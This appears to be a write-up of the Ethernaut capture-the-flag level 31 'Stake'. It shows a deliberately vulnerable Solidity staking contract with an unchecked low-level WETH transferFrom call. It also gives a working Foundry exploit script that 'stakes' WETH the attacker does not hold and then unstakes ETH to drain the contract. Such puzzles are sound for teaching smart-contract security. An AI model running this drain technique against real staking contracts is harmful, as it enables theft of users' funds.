# Level 31 - Stake ⏺⏺⏺

{% embed url="https://ethernaut.openzeppelin.com/level/31" %}

### Level Setup

{% hint style="info" %}
Stake is safe for staking native ETH and ERC20 WETH, considering the same 1:1 value of the tokens. Can you drain the contract?

To complete this level, the contract state must meet the following conditions:

* The `Stake` contract's ETH balance has to be greater than 0.
* `totalStaked` must be greater than the `Stake` contract's ETH balance.
* You must be a staker.
* Your staked balance must be 0.

Things that might be useful:

* [ERC-20](https://github.com/ethereum/ercs/blob/master/ERCS/erc-20.md) specification.
* [OpenZeppelin contracts](https://github.com/OpenZeppelin/openzeppelin-contracts)
{% endhint %}

### Level Contract

{% embed url="https://github.com/OpenZeppelin/ethernaut/blob/a89c8f7832258655c09fde16e6602c78e5e99dbd/contracts/src/levels/Stake.sol" %}

{% code lineNumbers="true" fullWidth="true" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```
{% endcode %}

### Exploit

{% tabs %}
{% tab title="Anvil" %}
```bash
make anvil-exploit-level-31

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}

{% tab title="Holesky" %}
```bash
make holesky-exploit-level-31

<INPUT_LEVEL_INSTANCE_CONTRACT_ADDRESS>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="Exploit Contract" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/51c13556556d7786c3d3aae552a8d9fa18b32d81/src/Level31.sol" %}

{% code title="src/Level31.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// ================================================================
// │                        LEVEL 31 - STAKE                      │
// ================================================================
interface IStake {
    function StakeETH() external payable;
}

contract AttackContract {
    IStake private immutable stake;

    constructor(address _stakeContract) payable {
        stake = IStake(_stakeContract);
    }

    function attack() external payable {
        // Become a staker with 0.001 ETH + 2 wei (1 will be left behind)
        stake.StakeETH{value: msg.value}();
    }
}
```
{% endcode %}
{% endtab %}

{% tab title="Exploit Deployment Script" %}
{% embed url="https://github.com/EridianAlpha/ethernaut-foundry/blob/51c13556556d7786c3d3aae552a8d9fa18b32d81/script/Level31.s.sol" %}

{% code title="script/Level31.s.sol" %}
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {HelperFunctions} from "script/HelperFunctions.s.sol";

import {AttackContract} from "src/Level31.sol";

// ================================================================
// │                        LEVEL 31 - STAKE                      │
// ================================================================
interface IWETH {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface IStake {
    function WETH() external view returns (address);
    function totalStaked() external view returns (uint256);
    function StakeETH() external payable;
    function StakeWETH(uint256 amount) external returns (bool);
    function Unstake(uint256 amount) external returns (bool);
    function Stakers(address) external view returns (bool);
    function UserStake(address) external view returns (uint256);
}

contract Exploit is Script, HelperFunctions {
    function run() public {
        address targetContractAddress = getInstanceAddress();
        IStake stake = IStake(targetContractAddress);
        uint256 amount = 0.001 ether + 1 wei;
        IWETH weth = IWETH(stake.WETH());

        vm.startBroadcast();

        // Deploy the AttackContract contract and stake some ETH
        AttackContract attackContract = new AttackContract(address(stake));
        attackContract.attack{value: amount + 1 wei}();

        // Become a staker
        stake.StakeETH{value: amount}();

        // Approve the stake contract to use WETH
        weth.approve(address(stake), amount);

        // Stake WETH (that we don't have!)
        stake.StakeWETH(amount);

        // Unstake ETH + WETH (leave 1 wei in Stake contract)
        stake.Unstake(amount * 2);

        // 1. The Stake contract's ETH balance has to be greater than 0
        console.log("Stake contract ETH balance:", address(stake).balance);
        require(address(stake).balance > 0, "Stake balance == 0");

        // 2. totalStaked must be greater than the Stake contract's ETH balance
        console.log("Total staked:", stake.totalStaked());
        require(stake.totalStaked() > address(stake).balance, "Balance > Total staked");

        // 3. You must be a staker.
        console.log("You are a staker:", stake.Stakers(address(msg.sender)), address(msg.sender));
        require(stake.Stakers(address(msg.sender)), "You are not a staker");

        // 4. Your staked balance must be 0.
        console.log("Your staked balance:", stake.UserStake(address(msg.sender)));
        require(stake.UserStake(address(msg.sender)) == 0, "Your staked balance != 0");

        vm.stopBroadcast();
    }
}
```
{% endcode %}
{% endtab %}
{% endtabs %}

2. Submit instance... 🥳

### Completion Message

{% hint style="info" %}
Congratulations, you have cracked the `Stake` machine!

When performing low-level calls to external contracts, it is important to properly validate external call returns to determine whether the call reverted.

For more info, check out [EEA EthTrust \[S\] Check External Calls Return](https://entethalliance.github.io/eta-registry/security-levels-spec.html#req-1-check-return) requirement, and always use [SafeERC20](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol) when interacting with external ERC-20 tokens.
{% endhint %}

### Notes

{% embed url="https://blog.pedrojok.com/the-ethernaut-ctf-solutions-31-stake" %}
